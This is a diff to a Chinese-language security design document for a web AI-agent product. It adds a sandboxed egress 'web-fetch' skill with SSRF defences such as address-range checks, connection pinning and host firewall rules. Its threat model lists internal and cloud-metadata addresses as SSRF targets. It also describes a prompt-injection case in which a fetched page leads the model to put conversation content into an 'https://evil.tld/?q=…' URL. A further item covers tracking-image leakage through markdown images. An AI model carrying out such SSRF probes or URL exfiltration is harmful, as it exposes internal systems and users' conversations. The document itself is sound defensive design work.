@@ -17,9 +17,20 @@
    搜索结果不做「指令过滤」:那是一场打不赢的字符串仗,而能力边界是可证明的
 6. **代码执行**(R-SKILLS-2 补,2026-09-03;所有者裁定,待实现)——访客(经模型)能驱动一个 Python 解释器跑**固定**的、
    随发版物带进镜像的脚本(`skill_run`)。新的威胁面:资源耗尽(CPU / 内存 / 进程数 / 磁盘)、沙箱逃逸、借脚本触达内网或本进程。
-   **兜底仍在能力**:脚本在独立容器里跑,那个容器**没有任何网络**、根文件系统只读、每次运行是一次性的进程与工作目录、
+   **兜底仍在能力**:脚本在独立容器里跑,那个容器**默认没有任何网络**(声明了出网档次的 skill 跑在另一个只出公网的实例里,见第 7 条)、根文件系统只读、每次运行是一次性的进程与工作目录、
    受 rlimit 与超时约束;脚本的**内容**只能来自代码(镜像层 + sha256 核对),模型给的只有一个受 schema 约束的 JSON 输入。
    「让 agent 写一段代码去跑」这句话在工具的词汇表里不存在
+7. **SSRF,经沙箱出网**(R-WEBFETCH 补,2026-09-03;所有者裁定,待实现)——访客(经模型)给一个 URL,让 egress 执行容器里的 `web-fetch` skill 去抓。
+   目标可以是 `127.0.0.1` / `10.x` / `172.16–31.x` / `192.168.x` / `169.254.169.254`(云元数据;腾讯云是 `169.254.0.23`)/ `100.64.0.0/10` /
+   IPv6 的 `::1` `fc00::/7` `fe80::/10` `::ffff:a.b.c.d`;变体:域名解析到内网、DNS rebinding(校验时回公网、连接时回内网)、重定向到内网、
+   `http://` 降级、非 443 端口扫描、`user:pass@host` 形态。**兜底在三层而不在字符串**:脚本自己解析、逐地址校验、钉住地址去连(每跳重来);
+   egress 容器不在任何 compose 内部网络里(`api` / `postgres` 对它不存在);宿主 `DOCKER-USER` 链对它的网段丢弃到私网 / link-local / CGNAT 的包。
+   **不维护任何域名黑白名单**(所有者裁定 2026-09-03:太多,无法维护);拒绝的是**地址段**,那是十来个固定的 RFC 段,零维护
+8. **经 URL 外泄**(R-WEBFETCH 补)——注入页可诱导模型「把对话内容拼进 `https://evil.tld/?q=…` 再抓一次」。能泄的只有**该访客自己**的会话
+   (R-VISITOR 隔离;工具闭包里没有 key,系统提示没有秘密)。缓解:提示词明令不把对话内容放进 URL、URL ≤ 2048、日限额、会话内计次。
+   **这是残余风险,不能被消除,所有者已认**(2026-09-03)
+9. **第三方资源引用进对话框**(R-WEBFETCH 补)——抓到的 markdown 若含 `![](https://第三方)`,模型抄进回复,`Markdown.tsx` 的 `img` 不限 src →
+   访客浏览器去拉第三方图 = 访客 IP 泄给第三方 + 跟踪像素。缓解:抽取时去图片 + 提示词「不要在回复里嵌入抓到的图片」;前端不改
 
 ## 1. 沙箱化工具执行环境(四层)
 
@@ -52,7 +63,8 @@ pi agent 需要调用工具(教程库只读查询;后续生图、联网搜索等
 
 1. **访客控不到网络原语**。请求的 URL / host / method / headers / model / 工具类型全部来自服务端配置,
    模型给的 `query` **只能落进请求体的一个字段**,且有长度上限。工具不接受任何形式的 URL 参数 ——
-   「让 agent 去抓这个地址」是 SSRF,不是搜索
+   「让 agent 去抓这个地址」是 SSRF,不是搜索。**本条对 api 进程内的工具一个字不改**;唯一的例外在沙箱执行组的 egress 档 skill
+   (R-WEBFETCH 补记,所有者裁定 2026-09-03):URL 不进 api 进程,只进 `skill_run.input` 转交只出公网的执行容器,那边有自己的第九条约束
 2. **目标域白名单**在代码里,不在库里。库(经 MCP)只能在白名单之内挑一个;白名单本身要改得发版。
    写入时校验一次(拒得早、看得见)、调用前再校验一次(库里可能躺着白名单收紧之前写下的行)。
    **必须 `redirect: "manual"` 并把 3xx 当失败**(codex 初审 P1):`fetch` 默认跟随重定向,
@@ -112,7 +124,7 @@ R-SKILLS-2 补记(2026-09-03,所有者裁定;规则 9「先改文档」——**�
 
 | | 沙箱执行组(`skill_run`) |
 |---|---|
-| 网络 | api → 执行容器**只有一条 unix socket**;执行容器本身 `network_mode: none`,没有任何网络(连 DNS 都没有),因而也回打不了 api / postgres |
+| 网络 | api → 执行容器**只有 unix socket**(每个实例一条);默认实例 `skill-runner` 本身 `network_mode: none`,没有任何网络(连 DNS 都没有),因而也回打不了 api / postgres。**egress 档**(R-WEBFETCH 补记,2026-09-03):同一镜像的第二个实例 `skill-runner-egress` 只在一个专用 bridge 网络里、不在 `front` / `back`,能出公网、够不到任何 compose 内部容器名;只有 `xray.json` 声明 `network: egress` 的 skill 会被路由到它,且两个实例各自拒绝不属于自己档次的 skill |
 | 凭据 | 不存在 |
 | `process.env` | 只在注册环节读(runner 地址的开发覆盖项,代码级闭集:`unix:` 默认值或 `http://127.0.0.1:<port>`),工具体内不读 |
 | 文件系统 / 子进程 / 动态 import | **api 进程内同样禁止**:api 只发一个 HTTP 请求。子进程发生在执行容器里,那是它存在的全部意义 |
@@ -139,6 +151,26 @@ R-SKILLS-2 补记(2026-09-03,所有者裁定;规则 9「先改文档」——**�
 命中即 `{block:true, reason}`;守卫自身抛异常按拦截处理(fail closed)。它的价值在**策略与可见性**(裁决进轨迹),不承担隔离。
 注入扩展 `xray-skills` 在 `before_agent_start` 追加 `<available_skills>` 目录。两者都**不得 `registerCommand`**
 (pi 会把访客以 `/` 开头的输入当命令分发)。
+
+R-WEBFETCH 补记(2026-09-03,所有者裁定;规则 9「先改文档」——**待实现,以下是约束不是现状**;方案与十条裁定见 `rounds/round-webfetch/round-webfetch.md`):
+
+- **沙箱执行组的 egress 档**:一个 skill 在 `xray.json` 里声明 `network: egress`(缺省 `none`),就只会被路由到 `skill-runner-egress` 实例;
+  首个成员是 `web-fetch`(访客给公网 `https://` 网址,脚本抓取并抽正文为 markdown)。它**不是**新工具、不是新分组:入口仍是 `skill_run`,
+  八条约束逐条照过;api 进程从头到尾**不碰 URL、不碰 HTML、不发这次请求**
+- **它是外呼组约束 1 的唯一例外,所有者已认**:URL 由访客控制。服务器由此成为一个**受限**取页器 —— 只 GET、只 https 443、固定请求头、
+  无 cookie / Authorization、限额、UA 表明身份(`AgentXRayBot/1 (+https://www.kzgai.cloud/)`);出网 IP 是站点自己的,被目标站封禁的也是站点自己
+- **第九条约束(egress 档独有),缺一条就不许收录**:①URL 收窄 —— scheme 只有 https、端口只有 443、无 userinfo、`href` ≤ 2048、hostname 至少一个点且
+  末标签为纯字母或 `xn--`(一刀切掉 v4 点分 / 整数 / 八进制 / 十六进制与 v6 方括号形态);②**解析后逐地址校验**(`getaddrinfo` 全部结果,任一落在
+  回环 / 私网 / link-local / CGNAT / 多播 / 保留 / 未指定 / 嵌套 v4 即拒,不挑);③**钉住校验过的地址去连**,证书仍按主机名校验,连上后核 `getpeername`;
+  ④重定向手动跟 ≤ 3 跳、每跳重走①②③;⑤读体按**解压后**字节计上界(256 KiB);⑥失败一律固定短码,**不区分**「内网所以拒」与「连不上」,
+  stdout / stderr 不写地址与跳转链;⑦地址段判据**在脚本代码里**、无 env 追加项(脚本 env 被清空,也不需要)。
+  **不维护任何域名黑名单 / 白名单**(所有者裁定:太多,无法维护)—— 拒的是固定的 RFC 地址段,不是域名;`localhost` / `*.local` / `*.internal`
+  这类名字不单列,它们要么解析不到、要么解析到②就会拒的地址
+- **准入清单对 egress 档的例外**:允许 `socket` / `ssl` / `http.client`(仍禁 `subprocess` / `ctypes` / `eval`);「确定性」不要求;
+  codex 审查要求多带一条:按上面七点逐条判 SSRF 判据
+- **资源上界的落点变了**:预研里防解析器超线性的 Worker 线程与元素 / 深度计数,在容器形态下由 `mem_limit` + 子进程 rlimit + 超时 kill 进程组承担,
+  最坏情况是「这一次运行失败」而不是「api 进程停」;字节上界仍必须(它同时卡内存与时长)。元素 / 深度计数改为按 Python 侧实测决定
+- 限额与超时**复用** `sandbox_config` / `daily_quota.skill_runs`,不另起一套;`skills_agent_set web-fetch false` 即单独下线
 
 ### 第 2 层 · 数据面只读
 
@@ -184,12 +216,17 @@ R-SKILLS 补记(2026-09-03,所有者裁定;规则 9「先改文档」,同日落�
 - **执行容器 `skill-runner`**(R-SKILLS-2,2026-09-03 裁定,待实现)比 api 再收紧三处:`network_mode: none`(不在任何 docker 网络里;api 经命名卷里的
   unix socket 调它)、`tmpfs /run/work` 为 `noexec,nosuid,nodev` 且有容量上限、`cpus` 限 1。其余同 api:非 root(与 api 同 uid,socket 才能共用)、
   `read_only`、`cap_drop ALL`、`no-new-privileges`、`mem_limit 384m`、`pids_limit 64`;子进程另叠 rlimit。它的 Python 基座与依赖按 digest / hash 钉(§7)
+- **egress 实例 `skill-runner-egress`**(R-WEBFETCH,2026-09-03 裁定,待实现):同一镜像、同一套收紧项,只有网络不同 —— `networks: [egress]`,
+  一个**只有它一个成员**的 bridge 网络(固定网段,给宿主过滤规则用),不在 `front` / `back`;docker 内嵌 DNS 只解析同网络的容器名,
+  `api` / `postgres` 对它不存在。`mem_limit 256m`、并发 1。它能到的是公网 443 与宿主上绑定 `0.0.0.0` 的端口(也就是本站自己);
+  云元数据与宿主的私网邻居靠脚本的地址段校验 + 宿主 `DOCKER-USER` 规则(§5)两道挡
 
 ### 第 4 层 · 出网管控
 
 - 外呼型工具(LLM / 生图 / 搜索)的 API key 全部服务端持有,目标域白名单
 - 每日 token + 费用计数(`daily_quota`),超限拒绝新会话;单会话 turn 上限
-- 用户无法借工具把服务器变成任意代理
+- 用户无法借工具把服务器变成**任意**代理。R-WEBFETCH(2026-09-03 裁定,待实现)的 egress 档 skill 是一个**受限**取页器
+  (只 GET 公网 https 页面、固定头、无凭据、限额、UA 表明身份),边界见 §1 R-WEBFETCH 补记
 - **沙箱执行也计日限额**(R-SKILLS-2,待实现):`daily_quota.skill_runs`,上限 `sandbox_config.daily_run_limit`(0 = 不限),与 `searches` / `images`
   同样各计各的、不合列;超限时工具抛固定文案(计为一次失败的工具调用),不拒整轮对话
 
@@ -285,6 +322,9 @@ R-SKILLS 补记(2026-09-03,所有者裁定;规则 9「先改文档」,同日落�
 - 备案期间云厂商封 80/443 → 用 IP + 非标端口自测,备案通过后再绑域名
 - **生产 80 不给任何响应**(所有者要求 2026-09-02,`deploy/Caddyfile` 全局 `auto_https disable_redirects`,连 80→443 的跳转都没有)。由此 **ACME 只剩 TLS-ALPN-01 一条通道,443 从「站点入口」变成「证书续期的唯一命脉」** —— 443 长时间不可达不只是站点打不开,而是证书也续不了。应急:临时注掉那行 + `caddy reload` 让 HTTP-01 顶上
 - **境内直连 Anthropic/OpenAI API 不通或不稳** → LLM 出口配置海外中转端点(自备官方 key),中转地址作为 secrets 管理
+- **宿主 `DOCKER-USER` 出网过滤**(R-WEBFETCH,2026-09-03 裁定,待实现):对 egress 网络的固定网段,丢弃目的为 `10/8` / `172.16/12` / `192.168/16` /
+  `169.254/16` / `100.64/10` / `127/8` 的包(`deploy/egress-filter.sh`,幂等;进上线检查单)。它是「脚本有 bug ≠ 内网可达」的那一道,
+  不替代脚本自己的地址段校验
 
 ### 5.1 HTTP 安全响应头(R11,所有者裁定 2026-09-02)
 
@@ -430,5 +470,6 @@ R-VISITOR 落地补记(2026-09-01,`apps/api/agent/visitor.ts` + `shared/visitor-
 - lockfile 固定版本;`npm audit` 进 CI;Dependabot 开启
 - pi 依赖体量大(~130MB),部署镜像分层缓存,升级前先在本地过一遍事件兼容性
 - **执行容器的供应链**(R-SKILLS-2,待实现):基座 `python:3.12-slim` 按 **digest** 钉;`runner/requirements.txt` 用 `pip install --require-hashes` 锁定;
-  执行容器自身零第三方依赖(`runner.py` 只用标准库)。**可运行脚本是仓库里的代码**,与其它代码一样走轮次 + codex 审查,审阅口径是
+  执行容器自身零第三方依赖(`runner.py` 只用标准库);R-WEBFETCH 起 `requirements.txt` 不再为空(抽取库 `trafilatura`,exact + hash,
+  可选依赖不装;只用它的 `extract`,不用它自带的下载器)。**可运行脚本是仓库里的代码**,与其它代码一样走轮次 + codex 审查,审阅口径是
   `rounds/round-skills/research.md` §2.2 的准入清单(stdin JSON → stdout;无 `subprocess` / `socket` / `eval`;不写 cwd 之外;确定性;有 schema)
